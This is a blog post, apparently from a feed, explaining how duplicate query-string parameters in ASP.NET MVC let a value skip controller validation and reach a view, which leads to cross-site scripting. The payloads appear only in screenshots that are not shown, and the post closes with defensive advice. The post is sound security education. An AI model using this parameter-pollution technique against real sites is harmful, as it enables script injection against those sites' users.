<p>ASP.NET MVC controller action method parameter binding doesn&#8217;t handle multiple instance of the same query string parameters in the same way. In fact, it behaves more like JSP on Jetty: <strong>it only uses the first value and ignores the rest</strong>.</p>

<p>Why is this bad? Well this means that code outside of controller actions may result in different behaviour to that which is inside. More importantly, accessing <code>Request.QueryString</code> to get access to a parameter doesn&#8217;t mean that you&#8217;ll get the same value as what was handled in the controller action.</p>

<p>Let&#8217;s take a look at what might happen if we threw multiple instances via the query string at our dodgy MVC application:</p>

<p><img src="http://buffered.io/uploads/2012/11/xss-hpp-invalid.png" title="'HPP example'" ></p>

<p>The above screenshot shows both the query string and the page source when we do this. That&#8217;s right, MVC used the first value, set to <code>0</code>, without any issues and invoked the view engine. The view&#8217;s assumption that the <code>index</code> parameter has been sanitised by the controller has now been proven unsafe. Now we can see that we do have access to the source. Let&#8217;s see what happens if we went a step further and passed in a more sinister value:</p>

<p><img src="http://buffered.io/uploads/2012/11/xss-hpp-valid.png" title="'HPP XSS exploit'" ></p>

<p>Pwned.</p>

<h2>Conclusion</h2>

<p><em>Never</em> trust unsanitised input, that includes stuff that gets passed in through <code>Request.QueryString</code>. Do not assume that the contents are safe just because your controller action handled things without throwing an exception. If you&#8217;re going to render data that has come in from the user or from the query string, delegate responsibility of validation to the controller action and only trust content which is passed to the view via <a href="http://msdn.microsoft.com/en-us/library/system.web.mvc.viewpage.viewdata(v=vs.108).aspx">ViewData</a> or the <code>Model</code>.</p>
]]></content>
  </entry>
  
</feed>
